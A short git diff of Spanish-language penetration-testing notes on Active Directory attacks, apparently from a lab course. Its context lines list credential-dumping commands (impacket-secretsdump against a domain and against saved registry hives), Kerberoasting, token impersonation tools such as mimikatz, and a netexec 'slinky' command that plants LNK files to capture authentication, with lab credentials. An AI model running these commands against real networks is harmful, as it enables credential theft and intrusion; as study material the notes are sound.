@@ -6,13 +6,14 @@
     - `impacket-secretsdump DC.LOCAL/USER:'PASSWORD'@$IP`
     - running secretsdump as local:
         - `impacket-secrestsdump -sam sam.save -security security.save -system system.save LOCAL`
-- [Kerberoasting](https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast)
+- [Kerberoasting](./kerberoasting.md)
     - [más material](https://tools.thehacker.recipes/impacket/examples/getuserspns.py)
     - Cuando comprometemos una cuenta, un ataque para empezar es este.
 - Token impersonation attack
     - psexec
     - [mimikatz](./mimikatz.md)
     - [pypykatz](./pypykatz.md)
+    - []()
 - [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`
     - Código:
 
